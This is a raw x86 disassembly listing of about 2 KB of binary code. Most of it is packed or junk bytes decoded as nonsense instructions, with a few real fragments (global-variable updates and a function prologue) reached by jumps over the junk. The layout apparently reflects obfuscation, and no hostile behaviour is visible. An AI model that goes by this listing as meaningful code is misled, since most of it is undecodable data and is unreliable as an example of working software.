  406ba4:	adc    BYTE PTR [ecx],0xb0
  406ba7:	aad    0x8
  406ba9:	mov    ebp,0xba7fba7e
  406bae:	jae    0x406b89
  406bb0:	out    dx,al
  406bb1:	ret    
  406bb2:	enter  0x190e,0x41
  406bb6:	push   esi
  406bb7:	cli    
  406bb8:	ins    DWORD PTR es:[edi],dx
  406bb9:	out    dx,eax
  406bba:	mov    eax,fs
  406bbc:	out    dx,eax
  406bbd:	jmp    0x4217:0x26c041af
  406bc4:	mov    BYTE PTR [ebx+eiz*4+0x49a43fc5],0x58
  406bcc:	push   esp
  406bcd:	dec    eax
  406bce:	xchg   bl,cl
  406bd0:	cmp    BYTE PTR [esi-0x621b4c4d],ch
  406bd6:	xor    DWORD PTR [edi+ecx*2+0x7894ac7e],edx
  406bdd:	and    eax,0x1a6b91ff
  406be2:	inc    ecx
  406be3:	rcl    DWORD PTR [edx],cl
  406be5:	add    DWORD PTR ds:0xc5c72484,esi
  406beb:	push   cs
  406bec:	pop    edi
  406bed:	fwait
  406bee:	and    bl,BYTE PTR [eax]
  406bf0:	les    esi,FWORD PTR [esi+eax*4]
  406bf3:	add    DWORD PTR [esi],edi
  406bf5:	pop    edx
  406bf6:	int    0xe4
  406bf8:	fwait
  406bf9:	mov    esi,0xcc328026
  406bfe:	jmp    0xf222:0x6e379b4b
  406c05:	sub    ch,BYTE PTR [edi-0x78]
  406c08:	mov    eax,0xab54cc2
  406c0d:	add    DWORD PTR [edi-0x44],ecx
  406c10:	arpl   WORD PTR [ebp+0x58dca0],si
  406c16:	sbb    DWORD PTR [ebx+eax*1+0x44],edx
  406c1a:	aas    
  406c1b:	loop   0x406c91
  406c1d:	add    edi,DWORD PTR [eax]
  406c1f:	sti    
  406c20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c21:	jne    0x406c25
  406c23:	out    0x77,eax
  406c25:	mov    gs,WORD PTR [ecx]
  406c27:	add    cl,dl
  406c29:	icebp  
  406c2a:	jmp    0xb0ebc846
  406c2f:	inc    esp
  406c30:	pop    esp
  406c31:	add    al,0x0
  406c33:	xor    al,0x99
  406c35:	add    dh,BYTE PTR [ecx-0x3e]
  406c38:	push   ebp
  406c39:	test   al,0xcb
  406c3b:	xchg   esi,eax
  406c3c:	adc    al,0x8a
  406c3e:	and    ebx,ecx
  406c40:	les    esp,FWORD PTR [edx+0x77]
  406c43:	pop    es
  406c44:	pop    ebp
  406c45:	leave  
  406c46:	lods   al,BYTE PTR ds:[esi]
  406c47:	cmc    
  406c48:	ja     0x406c26
  406c4a:	sbb    eax,DWORD PTR [esi+edx*8]
  406c4d:	mov    ebx,0x75b5d5ba
  406c52:	shl    BYTE PTR [edx+edx*8],0xd0
  406c56:	outs   dx,BYTE PTR ds:[esi]
  406c57:	mov    bl,0x1b
  406c59:	or     ecx,DWORD PTR [ecx-0x78]
  406c5c:	retf   0x2c40
  406c5f:	sub    ch,al
  406c61:	scas   eax,DWORD PTR es:[edi]
  406c62:	pop    es
  406c63:	push   es
  406c64:	(bad)  
  406c66:	pop    ecx
  406c67:	dec    ecx
  406c68:	jbe    0x406bfe
  406c6a:	add    BYTE PTR ds:0x22ceae3f,cl
  406c70:	cmp    DWORD PTR [ebx+ebx*2],ebp
  406c73:	lods   eax,DWORD PTR ds:[esi]
  406c74:	imul   ecx,DWORD PTR [edx],0xafe953ff
  406c7a:	inc    esp
  406c7b:	xlat   BYTE PTR ds:[ebx]
  406c7c:	mov    esi,0x383f52a8
  406c81:	sub    bh,BYTE PTR [edx+0x1f]
  406c84:	pop    edi
  406c85:	retf   
  406c86:	icebp  
  406c87:	dec    DWORD PTR [eax]
  406c89:	dec    ecx
  406c8a:	inc    ebp
  406c8b:	push   edx
  406c8c:	ja     0x406cc8
  406c8e:	sbb    BYTE PTR [edi],cl
  406c90:	push   ecx
  406c91:	pop    esp
  406c92:	adc    BYTE PTR [ebx-0x46],dh
  406c95:	mov    dl,0x10
  406c97:	or     BYTE PTR [ebp-0x2],bh
  406c9a:	int3   
  406c9b:	sub    al,0x2a
  406c9d:	(bad)  
  406c9e:	sti    
  406c9f:	sub    DWORD PTR [ecx+0x2a7dd3a4],edi
  406ca5:	(bad)  
  406ca6:	cmp    bh,BYTE PTR [ebp+0x346968f1]
  406cac:	cdq    
  406cad:	test   eax,0xec6b9c95
  406cb2:	push   cs
  406cb3:	xor    al,0x8
  406cb5:	push   esi
  406cb6:	xor    DWORD PTR [ebx],0xb6f23b19
  406cbc:	out    dx,al
  406cbd:	es dec edi
  406cbf:	mov    ds:0xacbecc23,eax
  406cc4:	mov    ecx,0x9229b5d6
  406cc9:	in     eax,0x8
  406ccb:	inc    ecx
  406ccc:	sbb    dh,cl
  406cce:	mov    edx,0x7d07729
  406cd3:	mov    ds:0xa19348a,al
  406cd8:	in     eax,dx
  406cd9:	lods   al,BYTE PTR ds:[esi]
  406cda:	jne    0x406cc9
  406cdc:	push   ds
  406cdd:	imul   edi,DWORD PTR [eax],0x38
  406ce0:	aad    0x11
  406ce2:	call   0x7979:0x37744abf
  406ce9:	fisub  DWORD PTR [eax+0x7ca32193]
  406cef:	jl     0x406cd8
  406cf1:	sbb    ecx,ebp
  406cf3:	shl    ebx,1
  406cf5:	cmp    esp,ecx
  406cf7:	in     al,0x4f
  406cf9:	leave  
  406cfa:	dec    ebp
  406cfb:	cmp    BYTE PTR [edx+0x1c667786],0xf6
  406d02:	lds    ebp,FWORD PTR [eax]
  406d04:	ins    BYTE PTR es:[edi],dx
  406d05:	sbb    ah,dh
  406d07:	popf   
  406d08:	aaa    
  406d09:	mov    edx,0xafbe3ea1
  406d0e:	xchg   esp,eax
  406d0f:	lock xchg edx,eax
  406d11:	iret   
  406d12:	fcomp  QWORD PTR [edi+0x6b]
  406d15:	retf   
  406d16:	popf   
  406d17:	or     BYTE PTR [ebp+0x48e98ab1],ah
  406d1d:	loopne 0x406cc8
  406d1f:	lea    ebx,[ecx+ebp*4-0x29b358bd]
  406d26:	scas   al,BYTE PTR es:[edi]
  406d27:	mov    ds:0x48057dd8,al
  406d2c:	and    eax,0x2f89f4fa
  406d31:	shrd   esp,edx,0xed
  406d35:	test   DWORD PTR [edi-0x32],ecx
  406d38:	out    0x9,al
  406d3a:	cwde   
  406d3b:	and    DWORD PTR [esi-0x4a],edx
  406d3e:	sbb    bl,bh
  406d40:	inc    esp
  406d41:	jmp    0x215a4f5c
  406d46:	data16 fnstsw WORD PTR [edx-0x65]
  406d4a:	imul   esp,DWORD PTR [esi-0x47e94925],0xb9c13366
  406d54:	add    bh,BYTE PTR [ebx]
  406d56:	add    BYTE PTR [eax],al
  406d58:	sbb    DWORD PTR ds:0x43372f,0x433613
  406d62:	add    ax,cx
  406d65:	add    DWORD PTR ds:0x433723,0x7d57
  406d6f:	mov    ecx,DWORD PTR [ebp+0x8]
  406d72:	movzx  eax,ax
  406d75:	sbb    DWORD PTR ds:0x433663,0x43360f
  406d7f:	jmp    0x406f5e
  406d84:	cmp    DWORD PTR [ebx],ebp
  406d86:	es fdivrp st(4),st
  406d89:	repz shr DWORD PTR [ecx],0x6c
  406d8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d8e:	pop    esi
  406d8f:	xor    al,0xcd
  406d91:	aas    
  406d92:	in     eax,dx
  406d93:	fs inc eax
  406d95:	cmp    BYTE PTR [esi+0x7e],bh
  406d98:	mov    esp,0xdd7e7e7f
  406d9d:	js     0x406d40
  406d9f:	push   edi
  406da0:	cmp    dl,al
  406da2:	stc    
  406da3:	dec    ebp
  406da4:	sub    esp,ebp
  406da6:	push   edi
  406da7:	loop   0x406d2d
  406da9:	(bad)  
  406daa:	and    al,0xc
  406dac:	gs or  al,0x1f
  406daf:	mov    ah,0x31
  406db1:	sti    
  406db2:	jb     0x406d72
  406db4:	inc    eax
  406db5:	inc    ecx
  406db6:	call   FWORD PTR [edx+0xd]
  406db9:	and    eax,DWORD PTR [ebx]
  406dbb:	lods   al,BYTE PTR ds:[esi]
  406dbc:	adc    DWORD PTR [esi-0x22],eax
  406dbf:	pop    edx
  406dc0:	iret   
  406dc1:	cdq    
  406dc2:	retf   
  406dc3:	sar    BYTE PTR [edx-0x6ad72e8c],0xc6
  406dca:	xor    DWORD PTR [ebx+0x49992b1e],0x26
  406dd1:	or     DWORD PTR [edx-0x6cf9c124],esp
  406dd7:	rol    esp,cl
  406dd9:	fbstp  TBYTE PTR [ebx+0x2e]
  406ddc:	in     al,0x56
  406dde:	cmp    cl,BYTE PTR [edx-0x13]
  406de1:	test   eax,0x681cb983
  406de6:	push   edi
  406de7:	(bad)  
  406de9:	xchg   ebp,eax
  406dea:	out    dx,al
  406deb:	add    al,BYTE PTR [ecx-0x7157ef99]
  406df1:	ins    BYTE PTR es:[edi],dx
  406df2:	dec    esi
  406df3:	(bad)  
  406df4:	jb     0x406d9a
  406df6:	xchg   edi,eax
  406df7:	test   BYTE PTR [edi-0x7],0xa2
  406dfb:	add    dl,BYTE PTR [ebx+0x28c554b4]
  406e01:	into   
  406e02:	pusha  
  406e03:	rcl    DWORD PTR [edi],1
  406e05:	mul    BYTE PTR [edi+0x61]
  406e08:	aaa    
  406e09:	mov    esi,0x145c7a04
  406e0e:	gs out 0x69,al
  406e11:	icebp  
  406e12:	fdivr  st,st(5)
  406e14:	daa    
  406e15:	paddb  mm0,mm1
  406e18:	ds or  esi,ebx
  406e1b:	jecxz  0x406ddf
  406e1d:	outs   dx,BYTE PTR ds:[esi]
  406e1e:	xor    eax,0xc8a9892a
  406e23:	pop    ebx
  406e24:	and    ecx,edi
  406e26:	shl    DWORD PTR [ebx+0x28],1
  406e29:	jle    0x406e58
  406e2b:	hlt    
  406e2c:	bound  eax,QWORD PTR [ebx+0x73]
  406e2f:	pop    esi
  406e30:	add    ch,al
  406e32:	retf   
  406e33:	inc    ebx
  406e34:	cmp    esp,eax
  406e36:	fisttp DWORD PTR [eax+0x73662cd9]
  406e3c:	dec    eax
  406e3d:	or     DWORD PTR [ecx+0x20f93855],edx
  406e43:	out    dx,eax
  406e44:	adc    ah,BYTE PTR [eax]
  406e46:	sub    BYTE PTR [eax+0x705806a5],0x86
  406e4d:	and    eax,0xe7002e48
  406e52:	jo     0x406e7a
  406e54:	imul   DWORD PTR [eax]
  406e56:	and    al,0xbc
  406e58:	jnp    0x406ea9
  406e5a:	dec    esi
  406e5b:	inc    esp
  406e5c:	mov    al,ds:0x63eca68a
  406e61:	mov    al,0x89
  406e63:	push   edx
  406e64:	sar    BYTE PTR [edx-0x24b245c9],0x47
  406e6b:	xor    eax,0xc88be50c
  406e70:	pop    edx
  406e71:	enter  0x2869,0x17
  406e75:	and    al,0xa2
  406e77:	daa    
  406e78:	sbb    ecx,ebp
  406e7a:	and    al,0xe9
  406e7c:	cli    
  406e7d:	push   0xffffffab
  406e7f:	jne    0x406e88
  406e81:	lahf   
  406e82:	cmp    DWORD PTR [edx],edi
  406e84:	lahf   
  406e85:	push   ds
  406e86:	inc    eax
  406e87:	jl     0x406ec4
  406e89:	sbb    DWORD PTR [edi+0x782d38f5],edx
  406e8f:	sub    al,0x77
  406e91:	pop    ecx
  406e92:	leave  
  406e93:	xchg   ecx,eax
  406e94:	sub    eax,0x621ba8c5
  406e99:	scas   al,BYTE PTR es:[edi]
  406e9a:	rol    DWORD PTR [ecx+0x4d],1
  406e9d:	loop   0x406e5a
  406e9f:	mov    ds:0x56cdd78a,al
  406ea4:	fstp   DWORD PTR [ecx+0x673ed61b]
  406eaa:	std    
  406eab:	dec    esp
  406eac:	mov    edi,0xe8ceca62
  406eb1:	sti    
  406eb2:	xor    eax,DWORD PTR [ecx+0x7f]
  406eb5:	jl     0x406e9c
  406eb7:	push   ss
  406eb8:	jo     0x406e50
  406eba:	clc    
  406ebb:	mov    dh,BYTE PTR [ecx+0x77]
  406ebe:	jmp    0xa4dab739
  406ec3:	add    eax,0x80f956c2
  406ec8:	mov    al,0x16
  406eca:	push   esp
  406ecb:	iret   
  406ecc:	add    DWORD PTR [eax],0x598af259
  406ed2:	cmp    ebp,DWORD PTR [esi-0x63]
  406ed5:	jnp    0x406edc
  406ed7:	xor    ch,BYTE PTR [edx+0x62]
  406eda:	(bad)  
  406edb:	aam    0x87
  406edd:	enter  0x2073,0x1b
  406ee1:	xchg   ebx,eax
  406ee2:	pusha  
  406ee3:	adc    bl,al
  406ee5:	sub    esi,ecx
  406ee7:	in     eax,dx
  406ee8:	sbb    dh,bh
  406eea:	push   0x3cfc5d3e
  406eef:	js     0x406f04
  406ef1:	cwde   
  406ef2:	out    0xf5,eax
  406ef4:	pop    ebx
  406ef5:	mov    ch,0xf2
  406ef7:	adc    eax,DWORD PTR [esi-0x2a091801]
  406efd:	imul   esp,edx,0x65463a60
  406f03:	xchg   ecx,eax
  406f04:	sub    bl,dh
  406f06:	push   ss
  406f07:	into   
  406f08:	push   bx
  406f0a:	mov    gs,WORD PTR [ebx+0x21]
  406f0d:	mov    esi,0xada33eae
  406f12:	jmp    0x25488fa7
  406f17:	ficomp WORD PTR [ecx+0x71]
  406f1a:	in     eax,dx
  406f1b:	daa    
  406f1c:	and    eax,0xd5fbbf7c
  406f21:	cld    
  406f22:	into   
  406f23:	push   esp
  406f24:	les    esp,FWORD PTR [ecx+0x3e1cfca7]
  406f2a:	cmc    
  406f2b:	xor    eax,0x822cc7ed
  406f30:	ins    DWORD PTR es:[edi],dx
  406f31:	add    eax,0x87411db0
  406f36:	and    ah,BYTE PTR ds:0xd7a68762
  406f3c:	pop    ds
  406f3d:	add    ebp,ecx
  406f3f:	push   esi
  406f40:	mov    cl,0xaa
  406f42:	add    al,0x75
  406f44:	fs loopne 0x406f5e
  406f47:	push   ebp
  406f48:	mov    ebx,0x99351ced
  406f4d:	adc    eax,0x83b6c86d
  406f52:	pushf  
  406f53:	ret    0x4f52
  406f56:	(bad)  
  406f57:	and    al,0xba
  406f59:	jne    0x406f1f
  406f5b:	out    dx,al
  406f5c:	int    0x88
  406f5e:	not    eax
  406f60:	and    DWORD PTR ds:0x43360f,0x433653
  406f6a:	and    eax,DWORD PTR [ecx]
  406f6c:	mov    ecx,DWORD PTR [ebp+0x8]
  406f6f:	mov    DWORD PTR [ecx],eax
  406f71:	jmp    0x406f7d
  406f76:	xor    DWORD PTR [ebp-0x4],0xe149eb8
  406f7d:	mov    ax,WORD PTR [ebp-0x8]
  406f81:	jmp    0x407160
  406f86:	dec    ebx
  406f87:	rcr    BYTE PTR [ecx],0x72
  406f8a:	mov    cl,0x73
  406f8c:	push   ecx
  406f8d:	loope  0x406f7e
  406f8f:	sahf   
  406f90:	adc    al,BYTE PTR ds:0x8c1d250
  406f96:	mov    es,esi
  406f98:	jle    0x407018
  406f9a:	mov    esp,0xf7e7e7f
  406f9f:	xchg   ebp,eax
  406fa0:	push   ds
  406fa1:	sub    dl,ah
  406fa3:	or     cl,bl
  406fa5:	loop   0x406fd6
  406fa7:	fisttp DWORD PTR [edx]
  406fa9:	add    bh,BYTE PTR [esi]
  406fab:	lods   al,BYTE PTR ds:[esi]
  406fac:	vsubps ymm4,ymm2,ymm1
  406fb0:	ins    BYTE PTR es:[edi],dx
  406fb1:	jo     0x406f7c
  406fb3:	fcom   QWORD PTR [ebx]
  406fb5:	sbb    DWORD PTR [esi+0x72b97789],ebx
  406fbb:	jmp    0x5581:0xa8fe45da
  406fc2:	std    
  406fc3:	push   ebx
  406fc4:	cwde   
  406fc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406fc6:	add    dh,BYTE PTR [ebx]
  406fc8:	push   ss
  406fc9:	dec    ebp
  406fca:	lods   eax,DWORD PTR ds:[esi]
  406fcb:	jmp    0x84fad446
  406fd0:	fsubr  DWORD PTR [esi+0x1f]
  406fd3:	leave  
  406fd4:	mov    ebp,0xe4615578
  406fd9:	pop    ebx
  406fda:	aaa    
  406fdb:	xor    esp,edx
  406fdd:	or     esi,DWORD PTR [edx+ebx*2+0x2e]
  406fe1:	pop    ss
  406fe2:	add    ebp,DWORD PTR [ecx+0x3e]
  406fe5:	(bad)  
  406fe7:	mov    dl,0x2
  406fe9:	outs   dx,BYTE PTR ds:[esi]
  406fea:	in     al,0x88
  406fec:	sbb    ch,BYTE PTR [esi-0x644521e6]
  406ff2:	sahf   
  406ff3:	loopne 0x407035
  406ff5:	clc    
  406ff6:	scas   eax,DWORD PTR es:[edi]
  406ff7:	sahf   
  406ff8:	call   0xbc7e42df
  406ffd:	jmp    0x6b7ce85d
  407002:	mov    cl,0x28
  407004:	popa   
  407005:	cdq    
  407006:	(bad)  
  407007:	aaa    
  407008:	adc    ebx,edx
  40700a:	or     esi,0x54fec2d9
  407010:	cmp    bl,BYTE PTR [ecx-0x270092de]
  407016:	pop    ebp
  407017:	stos   DWORD PTR es:[edi],eax
  407018:	pop    edx
  407019:	push   esi
  40701a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40701b:	mov    edx,?
  40701d:	or     BYTE PTR [edi+0x49ded062],ch
  407023:	mov    ch,0x8
  407025:	retf   
  407026:	push   edx
  407027:	mov    ch,0x7f
  407029:	cmp    BYTE PTR [esp+ebp*2],bh
  40702c:	inc    ebx
  40702d:	xchg   ebp,eax
  40702e:	and    ebx,ebx
  407030:	js     0x406fe5
  407032:	clc    
  407033:	mov    cl,0xc5
  407035:	clc    
  407036:	call   0x79ed:0x8fdceadd
  40703d:	call   0x8e8c:0x260ee4b9
  407044:	out    dx,al
  407045:	jae    0x407014
  407047:	jb     0x407063
  407049:	jmp    DWORD PTR gs:[esi+0x2bbc1f8d]
  407050:	mov    bh,0xe9
  407052:	(bad)  [edi-0x7f]
  407055:	mov    esp,0x61641bbc
  40705a:	xchg   BYTE PTR [ecx],cl
  40705c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40705d:	sub    eax,0xd46259d1
  407062:	lea    ecx,[eax-0x593e039d]
  407068:	lea    esp,[ebp-0x3f]
  40706b:	fwait
  40706c:	push   ss
  40706d:	icebp  
  40706e:	in     al,dx
  40706f:	ret    
  407070:	sub    cl,BYTE PTR [esi]
  407072:	push   esp
  407073:	xor    BYTE PTR [ebx],ah
  407075:	push   ecx
  407076:	mov    ebx,0x3fdb880c
  40707b:	cmp    eax,0xd0c561a0
  407080:	push   ebp
  407081:	shld   DWORD PTR [edx+ebx*2+0x724f3d3a],eax,cl
  407089:	mov    ebp,0x7092c795
  40708e:	xlat   BYTE PTR ds:[ebx]
  40708f:	and    DWORD PTR ds:0x90bb8e34,ebx
  407095:	out    0x8e,al
  407097:	loopne 0x40702d
  407099:	jmp    0x32c5:0xff9603ca
  4070a0:	mov    al,ds:0x37cb58f0
  4070a5:	add    DWORD PTR [ecx],eax
  4070a7:	lods   eax,DWORD PTR ds:[esi]
  4070a8:	(bad)  
  4070a9:	xchg   ecx,eax
  4070aa:	jno    0x40707c
  4070ac:	test   al,0xc2
  4070ae:	outs   dx,DWORD PTR ds:[esi]
  4070af:	adc    ebp,DWORD PTR [ebx+0x68c87cfe]
  4070b5:	mov    ds:0xab8b548a,al
  4070ba:	arpl   WORD PTR ds:0xd17c1166,dx
  4070c0:	push   esi
  4070c1:	aaa    
  4070c2:	imul   eax,DWORD PTR [esi+0x34],0x6cd7a252
  4070c9:	or     BYTE PTR [ebp-0x7b],al
  4070cc:	pushf  
  4070cd:	aaa    
  4070ce:	and    bl,bh
  4070d0:	fstp   QWORD PTR ds:0x6caf0ee8
  4070d6:	inc    esp
  4070d7:	sbb    ebp,ecx
  4070d9:	icebp  
  4070da:	pop    eax
  4070db:	inc    esi
  4070dc:	jl     0x4070d6
  4070de:	and    ecx,DWORD PTR [ebx+0x520753ac]
  4070e4:	adc    bl,BYTE PTR [edx+0x4]
  4070e7:	add    cl,al
  4070e9:	dec    ecx
  4070ea:	rol    BYTE PTR [edx+0x1842fa1e],0xa4
  4070f1:	addr16 xor eax,0xa1445b36
  4070f7:	jge    0x4070b9
  4070f9:	bound  eax,QWORD PTR [esi-0x5673fd8a]
  4070ff:	cli    
  407100:	out    dx,al
  407101:	push   ebp
  407102:	push   edx
  407103:	repnz cld 
  407105:	and    ecx,DWORD PTR [ebx-0x75]
  407108:	jp     0x40713c
  40710a:	dec    edx
  40710b:	cdq    
  40710c:	cmp    esp,edx
  40710e:	pop    esi
  40710f:	push   es
  407110:	sub    eax,0x767a0ed0
  407115:	xchg   ebp,eax
  407116:	dec    edx
  407117:	dec    esp
  407118:	xchg   esi,eax
  407119:	arpl   si,sp
  40711b:	lahf   
  40711c:	xchg   BYTE PTR gs:[edi-0x61],ah
  407120:	fwait
  407121:	rol    bh,1
  407123:	cmp    al,0xf6
  407125:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407126:	cmp    edi,edi
  407128:	inc    edx
  407129:	jge    0x4070df
  40712b:	stos   DWORD PTR es:[edi],eax
  40712c:	fldenv [esi-0x3b7dc9e4]
  407132:	retf   0xf38c
  407135:	mov    ebx,0x12369664
  40713a:	(bad)  
  40713b:	and    eax,0xec6dfaea
  407140:	and    al,0x47
  407142:	mov    edx,0xda66cc4
  407147:	mov    ds:0x9960ab7,eax
  40714c:	dec    esp
  40714d:	es inc esi
  40714f:	push   ds
  407150:	jbe    0x4071d0
  407152:	mov    eax,0x9f0b58a5
  407157:	inc    esp
  407158:	cmp    ebx,DWORD PTR [eax-0x2a]
  40715b:	ret    
  40715c:	mov    eax,ds:0xffff0faa
  407161:	jne    0x40716b
  407163:	call   0x407353
  407168:	test   eax,eax
  40716a:	jmp    0x407349
  40716f:	and    eax,0xb1edb090
  407174:	in     eax,dx
  407175:	popa   
  407176:	push   eax
  407177:	retf   
  407178:	xchg   BYTE PTR [ebx-0x74],dh
  40717b:	xchg   ecx,eax
  40717c:	in     eax,dx
  40717d:	mov    ah,0xb
  40717f:	int3   
  407180:	les    edi,FWORD PTR [esi+0x7e]
  407183:	mov    esp,0xda7e7e7f
  407188:	push   ebx
  407189:	repnz in eax,dx
  40718b:	retf   
  40718c:	pop    edi
  40718d:	jno    0x40714c
  40718f:	pop    eax
  407190:	push   esp
  407191:	rcr    DWORD PTR [eax],1
  407193:	pushf  
  407194:	cwde   
  407195:	test   DWORD PTR [edi],edx
  407197:	pop    esp
  407198:	mov    ebx,0xb4e98d5c
  40719d:	ret    0x9ae6
  4071a0:	stos   BYTE PTR es:[edi],al
  4071a1:	pop    ecx
  4071a2:	out    dx,eax
  4071a3:	mov    dh,0x95
  4071a5:	push   esi
  4071a6:	push   ecx
  4071a7:	(bad)  [ebp+0xd]
  4071aa:	fs inc esi
  4071ac:	pop    ss
  4071ad:	pop    ebp
  4071ae:	jno    0x40720d
  4071b0:	shl    BYTE PTR [ecx-0x12],0xa7
  4071b4:	push   ss
  4071b5:	(bad)  
  4071b7:	mov    ds:0xee33baa1,eax
  4071bc:	cli    
  4071bd:	scas   al,BYTE PTR es:[edi]
  4071be:	push   cs
  4071bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071c0:	jne    0x407170
  4071c2:	dec    ebx
  4071c3:	or     edi,DWORD PTR [ebx+0x1c0caa83]
  4071c9:	mov    edx,0x3aa9f47a
  4071ce:	retf   0xb626
  4071d1:	jne    0x407213
  4071d3:	aaa    
  4071d4:	pop    ebp
  4071d5:	call   0x2999:0xc3c98477
  4071dc:	or     DWORD PTR [ebx],ebp
  4071de:	xchg   BYTE PTR [edx-0x41cbd520],cl
  4071e4:	hlt    
  4071e5:	or     eax,0x45b2d399
  4071ea:	mov    cl,0xe4
  4071ec:	jp     0x4071e9
  4071ee:	adc    al,0xed
  4071f0:	out    0x55,al
  4071f2:	fisub  DWORD PTR [edi]
  4071f4:	shl    BYTE PTR [ecx+0x55],cl
  4071f7:	xchg   edi,eax
  4071f8:	sub    al,0x3b
  4071fa:	xchg   edx,eax
  4071fb:	mov    esp,0xa4e6c8b5
  407200:	dec    esp
  407201:	xchg   edx,eax
  407202:	into   
  407203:	adc    bl,BYTE PTR [ebx]
  407205:	std    
  407206:	cmp    edi,edx
  407208:	test   eax,0xaa4c641d
  40720d:	arpl   WORD PTR [esi-0x17],dx
  407210:	rcl    DWORD PTR [esi+0x25],1
  407213:	mov    cl,0x48
  407215:	les    ebx,FWORD PTR [ebx-0x17fced7c]
  40721b:	and    eax,0xeaf07266
  407220:	imul   edx,DWORD PTR [edx+eiz*1+0x3f318948],0x53
  407228:	ja     0x4071e7
  40722a:	inc    esi
  40722b:	pusha  
  40722c:	jge    0x407255
  40722e:	mov    DWORD PTR [edi],esi
  407230:	jg     0x407260
  407232:	std    
  407233:	cli    
  407234:	xchg   edi,eax
  407235:	mov    eax,eax
  407237:	mov    ecx,0x786b8386
  40723c:	ret    
  40723d:	sub    ch,BYTE PTR [eax-0x1c66fffb]
  407243:	xchg   edx,eax
  407244:	test   DWORD PTR [edx+0x6953c9ec],0x3c8c0c99
  40724e:	scas   eax,DWORD PTR es:[edi]
  40724f:	repnz jmp 0xe5f9:0x7519da4f
  407257:	je     0x407293
  407259:	nop
  40725a:	jge    0x407298
  40725c:	pop    eax
  40725d:	push   esi
  40725f:	cmp    BYTE PTR [edi-0x7d],al
  407262:	dec    ecx
  407263:	arpl   WORD PTR [esi],sp
  407265:	adc    al,0xee
  407267:	cmp    ebx,ebp
  407269:	mov    esi,edi
  40726b:	mov    esi,0x9b80a3da
  407270:	add    edx,edx
  407272:	ins    BYTE PTR es:[edi],dx
  407273:	das    
  407274:	repz cmp BYTE PTR [ebp+eax*1-0x6a2e0676],cl
  40727c:	xchg   ebx,eax
  40727d:	sar    DWORD PTR [ebp+0x6d],cl
  407280:	jae    0x4072f3
  407282:	mov    edx,eax
  407284:	push   0xffffffb1
  407286:	inc    ecx
  407287:	xchg   esp,eax
  407288:	fwait
  407289:	jo     0x407213
  40728b:	cvtps2pd xmm2,QWORD PTR [ecx+0x6d]
  40728f:	or     ah,BYTE PTR [edx]
  407291:	mov    ds:0x1ec37d7f,eax
  407296:	and    BYTE PTR [edi],dh
  407298:	sub    al,0xd8
  40729a:	jmp    0x85c5:0xda71da37
  4072a1:	ins    DWORD PTR es:[edi],dx
  4072a2:	ins    BYTE PTR es:[edi],dx
  4072a3:	pop    ebp
  4072a4:	int3   
  4072a5:	jecxz  0x4072f2
  4072a7:	and    BYTE PTR [ebx+edi*4+0xf],0xda
  4072ac:	add    ebp,DWORD PTR [edx-0x6c01e0d1]
  4072b2:	xchg   edx,eax
  4072b3:	fidiv  WORD PTR [esi+edx*8-0x32]
  4072b7:	outs   dx,DWORD PTR ds:[esi]
  4072b8:	ja     0x407257
  4072ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072bb:	cmp    eax,0x817cd1fd
  4072c0:	imul   ebx,DWORD PTR ds:0x2324672,0x4f
  4072c7:	repz xor esi,DWORD PTR [esi]
  4072ca:	push   ss
  4072cb:	cld    
  4072cc:	inc    edi
  4072cd:	jmp    0x1a2c:0x61023b0c
  4072d4:	and    DWORD PTR [ecx],edi
  4072d6:	(bad)  
  4072d7:	fs sti 
  4072d9:	outs   dx,DWORD PTR ds:[esi]
  4072da:	sbb    edx,DWORD PTR [edi+edi*4+0x36]
  4072de:	jno    0x407278
  4072e0:	inc    edi
  4072e1:	cmc    
  4072e2:	mov    al,ds:0xbf0f0cc6
  4072e7:	push   ebx
  4072e8:	fsub   QWORD PTR [esi-0x7c]
  4072eb:	lds    ebx,FWORD PTR [eax-0x3d]
  4072ee:	sar    DWORD PTR [ebx+0x6ef97079],0xc1
  4072f5:	pop    ecx
  4072f6:	adc    BYTE PTR [eax+eiz*8],al
  4072f9:	mov    ch,dl
  4072fb:	in     al,dx
  4072fc:	je     0x4072fa
  4072fe:	in     al,dx
  4072ff:	call   0x82af:0x25b8fbdd
  407306:	cmp    al,0x10
  407308:	lahf   
  407309:	jne    0x407292
  40730b:	cmp    BYTE PTR [ecx+0x17eaaa88],dl
  407311:	sbb    BYTE PTR [ebx],0x27
  407314:	mov    BYTE PTR [ecx-0x79],al
  407317:	in     al,dx
  407318:	addr16 js 0x4072aa
  40731b:	in     eax,dx
  40731c:	in     al,0xac
  40731e:	mov    ebx,0xbf916f12
  407323:	jnp    0x407360
  407325:	cmp    BYTE PTR [di+0x59],ch
  407329:	mov    eax,DWORD PTR [esi-0x4e]
  40732c:	mov    dl,0xf9
  40732e:	cmp    cl,dh
  407330:	(bad)  
  407332:	std    
  407333:	iret   
  407334:	(bad)  
  407335:	pop    ds
  407336:	fimul  WORD PTR [ebx]
  407338:	inc    esp
  407339:	ret    
  40733a:	jecxz  0x40739d
  40733c:	(bad)  
  40733e:	mov    edx,0xc7fe6f5d
  407343:	push   edi
  407344:	sub    al,0xbd
  407346:	mov    al,0xbe
  407348:	dec    ebx
  407349:	je     0x406f76
  40734f:	leave  
  407350:	ret    0x4
  407353:	push   ebp
  407354:	mov    ebp,esp
  407356:	sub    esp,0x2c
  407359:	and    DWORD PTR ds:0x433657,0x5787
  407363:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  40736a:	mov    eax,ds:0x43372b
  40736f:	or     DWORD PTR ds:0x43372f,eax
  407375:	jmp    0x40759d
  40737a:	pop    edx
  40737b:	cmp    al,0x59
  40737d:	inc    ebx
  40737e:	pop    ecx
  40737f:	arpl   WORD PTR [eax-0x1b],sp
  407382:	js     0x407389
  407384:	push   esi
  407385:	loope  0x4073b2
  407387:	jbe    0x407362
  407389:	aad    0xa
  40738b:	ret    0x7e7e
  40738e:	add    eax,0x9c7e7e7c
  407393:	and    eax,edx
  407395:	nop
  407396:	fisubr WORD PTR ds:0x22328bc6
  40739c:	mov    al,0xb6
  40739e:	stos   BYTE PTR es:[edi],al
  40739f:	mov    al,0x3e
